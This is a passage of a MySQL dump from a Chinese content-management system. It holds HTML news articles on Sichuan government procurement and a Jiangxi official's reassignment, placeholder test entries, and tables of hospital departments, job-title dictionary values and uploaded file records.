0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">3年来，各级财政部门依法处理政府采购投诉、举报案件1452件；对违反政府采购法律法规的47家采购人、41家采购代理机构、310家供应商、76名评审专家进行了行政处罚。同时，动态淘汰不合格评审专家1500多名。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">自2015年起，采取省市县三级联动、同步推进的方式，对政府采购代理机构的执业情况进行监督检查。2016年，创新性地将政府采购代理机构监督检查、考核以及政府采购执行情况绩效评价整合，对社会代理机构及其代理的政府采购项目开展全方位、多角度、解剖式的检查、考核和评价，全省共计检查政府采购代理机构446家，检查政府采购项目3669个，涉及采购金额810.6亿元，检查规模和质量在全国各省（市）中排名第一，受到财政部的高度评价。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">通过监督检查、考核和绩效评价，发现了政府采购活动中存在的问题和不足，明确了财政部门今后的重点监管方向。同时，通过对发现的违法违规行为的处理，震慑了政府采购当事人，也进一步规范了政府采购活动。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　30393人次</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　参加我省政府采购培训</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">近年来，我省为提高政府采购从业人员法制意识和执业能力，促进政府采购质量和效率提升，进行了多轮次法制政策和业务操作培训。据统计，2014年-2016年，省财政厅共举办各类培训班84期，采购人培训1500多人次、代理机构培训7500多人次、政府采购评审专家培训20593人次、政府采购监督管理工作人员培训800多人次。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">这些培训，于采购人而言，提高了认识及业务水平，推动了政府采购改革工作的深化；于代理机构而言，强化了从业人员的专业素质，提升了工作质量，促进了政府采购代理的规范化、专业化；于评审专家而言，提高了专业素质及政府采购评审工作质量，促进了政府采购的公平、公正；于监管人员而言，真正达到了统一思想、明确任务、振奋信心、提高本领的目的。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">探索政府采购政策宣传和执业教育新模式，针对不同的政府采购当事人和参与者，实现了对象全覆盖。同时，根据内容的不同，采取不同的方法、不同的形式，使宣传教育效果明显提高。通过宣传教育，使政府采购人、采购代理机构、评审专家、供应商等直接参与者明白了政府采购的“规矩”，也进一步扩大了政府采购的社会认知和认同，营造了良好的改革环境。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　378716条公告</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　政府采购信息全面公开</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">3年来，我省不断加大政府采购信息公开力度，全省在四川政府采购网发布采购公告137608条、采购结果公告132394条、变更公告36766条、采购合同公告55575条、投诉处理决定公告945条、进口产品审核前公示3346条、单一来源采购审核前公示8652条、采购需求论证公示2422条、质疑答复公示1008条，广泛接受社会监督，让政府采购活动在阳光下运行。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">正是不断完善政府采购信息公开制度，进一步强化监督管理，我省政府采购工作得到了社会广泛的肯定和认可。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政府采购信息公开，无论是对政府采购制度建设，还是社会公众、采购人、供应商来说，都是受益者。政府采购信息公开可以提高政府采购的透明度，方便社会公众监督，减少采购人的信息公告支出，便于供应商公平地获得采购信息。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('143', '<p class=\"f_center\" style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: center; white-space: normal; background-color: rgb(255, 255, 255);\"><img src=\"http://cms-bucket.nosdn.127.net/2520b467d3574df1877a5c412bf2990f20170115202118.png?imageView&thumbnail=550x0\" alt=\"undefined\"/></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">在退出省委常委班子两个月后，江西省省委原常委、宣传部原部长陈俊卿的新去向披露。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">据《江西日报》报道，昨日（1月14日）召开的省政协十一届二十二次常委会议上，年近54岁的陈俊卿被增补为省政协委员。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">政知圈的朋友圈里，好几位同行都转发了这条消息。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">曾主政南昌和上饶这两个江西重量级城市的陈俊卿曾受到众多媒体关注，他乐于与媒体打交道，也被媒体贴上了南昌“总经理”、“微博达人”和“微信书记”等富有个人特色的标签。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\"><strong>退常两个月后</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">公开履历显示，年近54岁的陈俊卿是福建南安人，曾在西安冶金建筑学院工业与民用建筑专业求学。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">21岁大学毕业后，他便南下，到毗邻福建的江西工作。先是进入中国有色金属工业总公司直管正厅级事业单位南昌有色冶金设计研究院，一路从助理工程师、工程师、深圳分院副院长、深圳分院院长拾级而上。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">2001年，年仅38岁的陈俊卿担任南昌有色冶金设计研究院副院长，主持全院行政工作。约一年后，陈俊卿被提拔为正厅级干部，担任南昌有色冶金设计研究院院长。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">2007年，在研究院工作了近23年的陈俊卿，出任江西省建设厅党组书记、厅长，正式踏入仕途。之后又担任改组后的江西省住房和城乡建设厅党组书记、厅长。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">2010年，47岁的陈俊卿开始主政江西省会南昌，先后担任中共南昌市委副书记、市人民政府副市长、南昌市市长。在主政南昌近三年后，陈俊卿在2013年8月调任江西东北部重镇上饶，担任上饶市委书记。2016年3月，他进入江西省委常委班子，并在一个月后兼任省委宣传部部长，直至2016年11月在省委班子换届中卸任这两个职务。彼时，距离他“入常”仅有8个月时间。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: &quot;Microsoft Yahei&quot;; color: rgb(64, 64, 64); text-align: justify; white-space: normal; background-color: rgb(255, 255, 255);\">这一变动颇让政知圈感到意外。党委换届前“入常”，往往是为党代会做必要的铺垫和准备，这样的官员大多数换届时能留任，并在下一步明确分工。不过除了陈俊卿，还有云南省委原副书记钟勉都在换届时“退常”，继而在一段时间后明确新去处。钟勉调任贵州省副省长，未进入该省常委班子；而陈俊卿增补为政协委员后，是否有新动向仍有待披露。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('144', '<p>阿萨德发的发送到发送到发送到发送到法师法师法师打发</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('145', '<p>啥方法沙发沙发舒服撒发生的方法反反复复凤飞飞反复反复反复反复反复反复</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('146', '<p>asfasfaszzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzsadfasfd</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('147', '<p>阿斯顿发顺丰大沙发大法师的法师辅导</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('148', '<p>在vxvxzcvxzcvzxvx</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('149', '<p>阿士大夫撒飞洒发萨芬撒飞洒发生法撒旦法师法师分散</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('150', '<p>爱上大法师的法师法三法师打发</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('151', '<p>十分撒旦法师法撒旦法师法师打发的飞洒发</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('152', '<p>沙发是的发生发生的发生</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('153', '<p>是的发生法法师法师的法师法师打发</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('154', '<p>撒旦法师法师的顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶大大大发顺丰的</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('155', '<p>阿斯顿发沙发沙发沙发沙发沙发</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('156', '<p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊阿士大夫撒发生</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('157', '<p>asdfa阿斯顿发沙发沙发沙发沙发斯蒂芬</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('158', '<p>阿事实上事实上事实上事实上事实上事实上事实上</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('159', '<p>阿斯顿发沙发沙发沙发沙发沙发</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('160', '<p>附件急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('161', '<p>阿事实上事实上事实上事实上事实上事实上事实上事实上</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('162', '<p>快快快快快快快快快快快快快快快快快快快快快快快快卡卡是的发生法</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('163', '<p>积极急急急急急急急急急急急急急急急急急急急急急急急急</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('164', '<p>啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦了</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('165', '<p>在啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧重中之重</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('166', '<p>啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('167', '<p>啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧vzxv</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('168', '<p>徐州续写操作vzxvxzvz啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊大师傅</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('169', '<p>阿斯顿发沙发沙发沙发沙发沙发是否案说法撒</p>', null, null, null);

-- ----------------------------
-- Table structure for jc_content_type
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_type`;
CREATE TABLE `jc_content_type` (
  `type_id` int(11) NOT NULL,
  `type_name` varchar(20) NOT NULL COMMENT '名称',
  `img_width` int(11) DEFAULT NULL COMMENT '图片宽',
  `img_height` int(11) DEFAULT NULL COMMENT '图片高',
  `has_image` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有图片',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`type_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容类型表';

-- ----------------------------
-- Records of jc_content_type
-- ----------------------------
INSERT INTO `jc_content_type` VALUES ('1', '普通', '100', '100', '0', '0');
INSERT INTO `jc_content_type` VALUES ('2', '图文', '510', '288', '1', '0');
INSERT INTO `jc_content_type` VALUES ('3', '焦点', '280', '200', '1', '0');
INSERT INTO `jc_content_type` VALUES ('4', '头条', '0', '0', '0', '0');

-- ----------------------------
-- Table structure for jc_department
-- ----------------------------
DROP TABLE IF EXISTS `jc_department`;
CREATE TABLE `jc_department` (
  `depart_id` int(11) NOT NULL AUTO_INCREMENT,
  `depart_name` varchar(255) NOT NULL DEFAULT '' COMMENT '部门名称',
  `site_id` int(11) DEFAULT '0' COMMENT '站点',
  `priority` int(11) NOT NULL DEFAULT '1' COMMENT '排序',
  `weights` int(11) NOT NULL DEFAULT '1' COMMENT '权重(值越大，级别越高)',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级部门ID',
  PRIMARY KEY (`depart_id`),
  KEY `fk_jc_department_site` (`site_id`),
  KEY `fk_jc_jc_department_parent` (`parent_id`),
  CONSTRAINT `fk_jc_jc_department_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_department` (`depart_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='部门';

-- ----------------------------
-- Records of jc_department
-- ----------------------------
INSERT INTO `jc_department` VALUES ('1', '四川大学华西医院', null, '1', '1', null);
INSERT INTO `jc_department` VALUES ('2', '北京协和医院', null, '2', '1', null);
INSERT INTO `jc_department` VALUES ('3', '病理科', null, '1', '1', '1');
INSERT INTO `jc_department` VALUES ('4', '病理科', null, '1', '1', '2');
INSERT INTO `jc_department` VALUES ('5', '放射科', null, '2', '1', '2');
INSERT INTO `jc_department` VALUES ('6', '其他医院', null, '3', '1', null);

-- ----------------------------
-- Table structure for jc_dictionary
-- ----------------------------
DROP TABLE IF EXISTS `jc_dictionary`;
CREATE TABLE `jc_dictionary` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT 'name',
  `value` varchar(255) NOT NULL COMMENT 'value',
  `type` varchar(255) NOT NULL COMMENT 'type',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8 COMMENT='字典表';

-- ----------------------------
-- Records of jc_dictionary
-- ----------------------------
INSERT INTO `jc_dictionary` VALUES ('1', '初级', '初级', '级别');
INSERT INTO `jc_dictionary` VALUES ('2', '中级', '中级', '级别');
INSERT INTO `jc_dictionary` VALUES ('3', '高级', '高级', '级别');
INSERT INTO `jc_dictionary` VALUES ('4', '主治医师', '主治医师', '职称');
INSERT INTO `jc_dictionary` VALUES ('5', '副教授', '副教授', '职称');
INSERT INTO `jc_dictionary` VALUES ('6', '教授', '教授', '职称');
INSERT INTO `jc_dictionary` VALUES ('7', '副主任医师', '副主任医师', '职称');
INSERT INTO `jc_dictionary` VALUES ('8', '内科', '内科', '专业');
INSERT INTO `jc_dictionary` VALUES ('9', '外科', '外科', '专业');
INSERT INTO `jc_dictionary` VALUES ('10', '副研究员', '副研究员', '职称');
INSERT INTO `jc_dictionary` VALUES ('11', '讲师', '讲师', '职称');
INSERT INTO `jc_dictionary` VALUES ('12', '研究员', '研究员', '职称');
INSERT INTO `jc_dictionary` VALUES ('13', '医师', '医师', '职称');
INSERT INTO `jc_dictionary` VALUES ('14', '主管技师', '主管技师', '职称');
INSERT INTO `jc_dictionary` VALUES ('15', '主任医师', '主任医师', '职称');
INSERT INTO `jc_dictionary` VALUES ('16', '助教', '助教', '职称');
INSERT INTO `jc_dictionary` VALUES ('17', '助理研究员', '助理研究员', '职称');
INSERT INTO `jc_dictionary` VALUES ('18', '医士', '医士', '职称');
INSERT INTO `jc_dictionary` VALUES ('19', '主管医师', '主管医师', '职称');
INSERT INTO `jc_dictionary` VALUES ('20', '护士', '护士', '职称');
INSERT INTO `jc_dictionary` VALUES ('21', '护师', '护师', '职称');
INSERT INTO `jc_dictionary` VALUES ('22', '主管护师', '主管护师', '职称');
INSERT INTO `jc_dictionary` VALUES ('23', '副主任护师', '副主任护师', '职称');
INSERT INTO `jc_dictionary` VALUES ('24', '主任护师', '主任护师', '职称');
INSERT INTO `jc_dictionary` VALUES ('25', '技士', '技士', '职称');
INSERT INTO `jc_dictionary` VALUES ('26', '技师', '技师', '职称');
INSERT INTO `jc_dictionary` VALUES ('27', '副主任技师', '副主任技师', '职称');
INSERT INTO `jc_dictionary` VALUES ('28', '主任技师', '主任技师', '职称');
INSERT INTO `jc_dictionary` VALUES ('29', '主任药师', '主任药师', '职称');
INSERT INTO `jc_dictionary` VALUES ('30', '副主任药师', '副主任药师', '职称');
INSERT INTO `jc_dictionary` VALUES ('31', '主管药师', '主管药师', '职称');
INSERT INTO `jc_dictionary` VALUES ('32', '药师', '药师', '职称');
INSERT INTO `jc_dictionary` VALUES ('33', '药士', '药士', '职称');
INSERT INTO `jc_dictionary` VALUES ('34', '其他', '其他', '职称');
INSERT INTO `jc_dictionary` VALUES ('35', '中国', '中国', '国籍');
INSERT INTO `jc_dictionary` VALUES ('36', '外国', '外国', '国籍');

-- ----------------------------
-- Table structure for jc_directive_tpl
-- ----------------------------
DROP TABLE IF EXISTS `jc_directive_tpl`;
CREATE TABLE `jc_directive_tpl` (
  `tpl_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '标签名称',
  `description` varchar(1000) DEFAULT NULL COMMENT '标签描述',
  `code` text COMMENT '标签代码',
  `user_id` int(11) NOT NULL COMMENT '标签创建者',
  PRIMARY KEY (`tpl_id`),
  KEY `fk_jc_directive_tpl_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FComment';

-- ----------------------------
-- Records of jc_directive_tpl
-- ----------------------------

-- ----------------------------
-- Table structure for jc_file
-- ----------------------------
DROP TABLE IF EXISTS `jc_file`;
CREATE TABLE `jc_file` (
  `file_path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `file_name` varchar(255) DEFAULT '' COMMENT '文件名字',
  `file_isvalid` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有效',
  `content_id` int(11) DEFAULT NULL COMMENT '内容id',
  PRIMARY KEY (`file_path`),
  KEY `fk_jc_file_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jc_file
-- ----------------------------
INSERT INTO `jc_file` VALUES ('/u/cms/www/201607/19141129f6g4.jpg', 'qweq.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201607/19141205t5d9.jpg', 'MAIN201607190815465375224112529.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201607/19142033fu5h.jpg', 'zxc.jpg', '1', '14');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201608/30174757ffr0.jpg', '255901999.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103353l0rl.png', 'small-prev-page-on.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/131035049a54.png', 'm-sj.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103723gjne.png', 'small-prev-page-on.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103724lwp5.png', 'small-next-page.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103724wi3l.png', 'small-next-page-on.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/1310372501bw.png', 'small-prev-page.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103813zfv9.png', 'member-nav.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103824db3u.png', 'm-sj.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19152319tjq4.png', 'zsr.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19152412hzzi.png', 'zsr.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191535032l85.png', 'zhye.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19153503qjwl.png', 'zsr.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19153920h4eu.png', 'zhye.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19154055s1o7.png', 'zhye.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191544366efu.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19154641z4av.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191547450q92.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19154854sed0.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155012rfja.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155535g178.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191556168oxh.png', 'zhye.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191557592avc.png', 'zsr.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155839xtw8.png', 'zhye.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191559127g8a.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155948ohk3.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191601382uqh.png', 'txsj.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19160214xqcz.png', 'gmcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19160256yti4.png', 'txcs.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/22165418ezkw.jpg', 'vs.jpg', '1', '28');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/23091850z61y.jpg', 'ttsf.jpg', '1', '32');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/23092240hxg8.jpg', 'adff.jpg', '1', '33');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/23093922giys.jpg', 'bc.jpg', '1', '36');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/230942139uh5.jpg', 'xcv.jpg', '1', '37');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/23095358y6s6.jpg', 'qw.jpg', '1', '39');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/23100710845n.jpg', 'sf.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/23150119m7z0.jpg', 'zsf.jpg', '1', '27');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/26101908i5ds.jpg', 'video02.jpg', '1', '53');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/26102008qcao.jpg', 'video04.jpg', '1', '55');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/26102115joze.jpg', 'video06.jpg', '1', '57');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/261022192w54.jpg', 'video08.jpg', '1', '59');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/26102904f2l8.jpg', 'video12.jpg', '1', '61');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/26103003hrib.jpg', 'video11.jpg', '1', '63');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/270953566xxw.jpg', 'content-bdy.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/27095528bd43.jpg', 'download02.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/29093250bbit.jpg', 'a0a3201e6a6ca24c4c918f56bbb212d5.jpg', '1', '74');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/30114226529k.jpg', 'wenku_item02.jpg', '1', '68');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/301143025tdb.jpg', 'wenku_item03.jpg', '1', '67');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08153906dmjk.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/081540214khn.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08154224b4zl.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08155845dhts.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08160110rjjx.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/081602097gfq.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08162230t0wf.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08162651u5t0.jpg', 'wenku_item05.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10100842hqdk.jpg', 'topic_title03.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10100850mssf.jpg', 'topic03.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10100951y2xy.jpg', 'topic_title02.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/1010095517rc.jpg', 'topic02.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101010021q7v.jpg', 'topic_title01.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10101006fqv3.jpg', 'topic01.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10114452yjhh.jpg', 'zxcvx.jpg', '1', '166');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10114704dsba.jpg', 'cb.jpg', '1', '112');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101308178wzr.jpg', 'df.jpg', '1', '114');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101314450fs1.jpg', 'banner02.jpg', '1', '115');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101317064t3l.jpg', 'xZ.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10131759kpti.jpg', '5672662427112447485.jpg', '1', '116');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101320442qbi.jpg', 'zdsad.jpg', '1', '117');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10132253w0rj.jpg', 'sf.jpg', '1', '118');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101326014zdc.jpg', 'banner02.jpg', '1', '119');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10133449hwwr.jpg', 'vjkhk.jpg', '1', '120');
